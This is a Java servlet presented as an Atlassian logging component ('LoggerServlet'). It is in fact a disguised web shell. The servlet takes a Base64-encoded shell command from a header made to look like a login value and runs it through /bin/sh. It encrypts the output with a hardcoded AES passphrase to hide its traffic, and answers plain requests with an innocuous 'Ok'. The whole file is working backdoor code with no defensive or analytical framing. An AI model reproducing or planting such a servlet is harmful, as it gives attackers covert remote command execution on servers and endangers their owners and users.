package com.atlassian.utils.logmanager.logger;

import java.io.*;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;
import java.security.spec.KeySpec;

public class LoggerServlet extends HttpServlet{

    @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException
    {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            String cmd = request.getHeader("X-Seraph-LoginValue");
            if (cmd == null)
            {
                PrintWriter out = response.getWriter();
                out.write("Ok");
                return;
            }
            else {
                byte[] decodedcmd = Base64.getDecoder().decode(cmd);
                cmd = new String(decodedcmd);
            }
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            InputStream inStream = process.getInputStream();
            InputStream errStream = process.getErrorStream();

            byte[] buf = new byte[8192];
            int length;
            while ((length = inStream.read(buf)) != -1) {
                bos.write(buf,0, length);
            }

            while ((length = errStream.read(buf)) != -1) {
                bos.write(buf,0, length);
            }

            inStream.close();
            errStream.close();
        } catch (Throwable throwable) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);
            throwable.printStackTrace(pw);
            pw.close();
            bos.write(sw.toString().getBytes());
        }
        try {
            /* Encrypt */
            SecureRandom secureRandom = new SecureRandom();
            byte[] iv = new byte[16];
            secureRandom.nextBytes(iv);
            IvParameterSpec ivspec = new IvParameterSpec(iv);

            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            KeySpec spec = new PBEKeySpec("INTFINITY".toCharArray(), "SALT".getBytes(), 65536, 256);
            SecretKey tmp = factory.generateSecret(spec);
            SecretKeySpec secretKeySpec = new SecretKeySpec(tmp.getEncoded(), "AES");
            

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivspec);

            byte[] cipherText = cipher.doFinal(bos.toByteArray());
            byte[] encryptedData = new byte[iv.length + cipherText.length];
            System.arraycopy(iv, 0, encryptedData, 0, iv.length);
            System.arraycopy(cipherText, 0, encryptedData, iv.length, cipherText.length);

            String result = Base64.getEncoder().encodeToString(encryptedData);
            PrintWriter out = response.getWriter();
            
            out.write((result));

        } catch (Exception e) {
            System.out.print("Error");
        }
        
    }
}
